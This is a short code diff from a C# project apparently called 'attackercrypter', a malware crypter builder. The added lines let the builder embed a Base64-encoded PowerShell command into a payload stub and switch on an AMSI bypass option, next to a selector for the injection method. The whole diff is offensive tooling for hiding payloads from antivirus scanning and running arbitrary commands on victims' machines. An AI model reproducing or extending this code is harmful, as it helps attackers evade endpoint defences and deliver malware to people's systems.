@@ -206,7 +206,17 @@ namespace attackercrypter
 
                 }
 
-
+                if (powershell.Enabled == true)
+                {
+                    Source = Source.Replace("public static bool ispwcommand = false;", "public static bool ispwcommand = true;");
+                    byte[] bytes = System.Text.Encoding.Unicode.GetBytes(powershellcommand.Text);
+                    string encodedCommand = System.Convert.ToBase64String(bytes);
+                    Source = Source.Replace("$command",encodedCommand );
+                }
+                if (Amsi.Enabled == true)
+                {
+                    Source = Source.Replace("public static bool ispassamsi = false;", "public static bool ispassamsi = true;");
+                }
 
                 if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
                 {
